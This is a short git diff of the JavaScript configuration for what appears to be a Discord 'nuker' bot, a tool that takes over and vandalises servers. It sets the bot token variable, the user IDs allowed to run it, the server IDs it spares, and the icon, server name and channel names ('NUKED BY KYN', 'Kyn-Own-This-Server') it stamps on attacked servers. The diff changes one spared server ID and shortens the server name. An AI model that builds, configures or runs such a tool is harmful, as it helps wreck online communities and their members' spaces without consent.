@@ -12,9 +12,9 @@ module.exports = {
     nuker: {
         token: process.env.TOKEN_NUKER,
         allowedUserIds: ['1284886248330231891', '1360301293872091136', '1340617218542800916'],
-        whitelistedServerIds: ['122', '123'],
+        whitelistedServerIds: ['1366020454795579496', '123'],
         serverIcon: 'https://cdn.discordapp.com/avatars/1284886248330231891/d483984f4119be0f7ad1a7b892bf0d37.png',
-        serverName: 'NUKED BY KYN🤡/goldsociety',
+        serverName: 'NUKED BY KYN🤡',
         channelNames: [
             'Nuked-By-Kyn-☠️💣',
             'Kyn-Own-This-Server-😹💤'
